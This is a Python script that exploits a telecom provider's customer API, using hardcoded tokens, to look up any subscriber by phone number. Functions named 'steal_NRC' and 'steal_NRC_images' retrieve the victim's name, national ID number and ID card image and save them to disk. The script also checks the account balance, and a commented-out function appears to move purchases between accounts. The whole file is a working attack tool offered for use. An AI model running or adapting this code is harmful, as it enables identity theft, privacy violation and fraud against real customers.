import requests 
import json
import base64
import os

def createFolder(directory):
    try:
        if not os.path.exists(directory):
            os.makedirs(directory)
    except OSError:
        print ('Error: Creating directory. ' +  directory)
        
def get_api_call(API_ENDPOINT,authtoken):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
    'authtoken' : authtoken,
    'Referer' : 'https://my.mpt.com.mm/',
    'securitycode' : '682ed83a7014b94da1568496e1a9ecd0',
    'X-Requested-With' : 'XMLHttpRequest',
    'Content-Type' : 'application/json; charset=UTF-8'
    }
    response = requests.get(url = API_ENDPOINT, headers = headers) 
    data = json.loads(response.text)
    return data

def post_api_call(API_ENDPOINT,authtoken,post_data):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',
    'authtoken' : authtoken,
    'Referer' : 'https://my.mpt.com.mm/',
    'securitycode' : '682ed83a7014b94da1568496e1a9ecd0',
    'X-Requested-With' : 'XMLHttpRequest',
    'Content-Type' : 'application/json; charset=UTF-8'
    }

    
    response = requests.post(url=API_ENDPOINT,headers = headers,json = post_data)
    data = json.loads(response.text)
    return data

def steal_NRC(customer_code):
    customer_api = "https://my.mpt.com.mm/api/services/customer/v1/code/"+customer_code

    customer_data = get_api_call(customer_api,authtoken)

    customer_name = customer_data["custName"]
    customer_nrc = customer_data["certNbr"]

    print("Customer Name : "+customer_name)
    print("Customer NRC No : "+ customer_nrc)

def check_Balance(account_number):
    balance_api = "https://my.mpt.com.mm/api/services/account/v1/balance/code/"+account_number+"?lang=1"
    balance_data = get_api_call(balance_api,authtoken)

    summarys_data = balance_data["summarys"]
    balance_data = balance_data["balanceList"]

    balance_list = balance_data[0]
    summarys = summarys_data[1]

    bill_balance = balance_list["displayBalTxt"]      
    data_balance = summarys["displayBalTxt"]

    print("Bill Balance : "+bill_balance+" Ks")
    print("Data Balance : "+data_balance)

def steal_NRC_images(customer_code):
    createFolder('./NRC_Images/')
    customer_nrc_image_api = "https://my.mpt.com.mm/api/services/customer/v1/certification/imagefiles/"+customer_code

    customer_nrc_image_data = get_api_call(customer_nrc_image_api,authtoken)
    imageList = customer_nrc_image_data["imageList"]

    image_data = imageList[1]

    imgdata = base64.b64decode(image_data["image"])
    filename =  str(ph_number)+".jpg"

    os.chdir("./NRC_Images/")
    with open(filename, 'wb') as f:
        f.write(imgdata)

    print("NRC Image is saved!")

def steal_Data_Balance(your_ph_number,victim_ph):
    purchase_transfer = "https://my.mpt.com.mm/api/services/subscriber/v1/purchase/msisdn/"+victim_ph
    post_data = {
    "msisdn": victim_ph,
    "offerIds": [
        1168
    ],
    "iPoint": "ALL",
    "paymentMethod": "ACCOUNT",
    "amount": "699",
    "paymentMsisdn": your_ph_number
    }
    purchase_transfer_data = post_api_call(purchase_transfer,authtoken,post_data)
    print(purchase_transfer_data["errorDetail"])
     

input_number = input("MPT Number : ")
ph_number = "95"+input_number[1:]

subscriber_api = "https://my.mpt.com.mm/api/services/subscriber/v1/indentify/" + ph_number
authtoken = "3914fe642eb1dd63d188280c0dd9fee3"

subscriber_data = get_api_call(subscriber_api,authtoken)

customer_code = subscriber_data["custCode"]
account_number = subscriber_data["acctNbr"]

check_Balance(account_number)
steal_NRC(customer_code)
steal_NRC_images(customer_code)
#steal_Data_Balance("959250581152",ph_number)
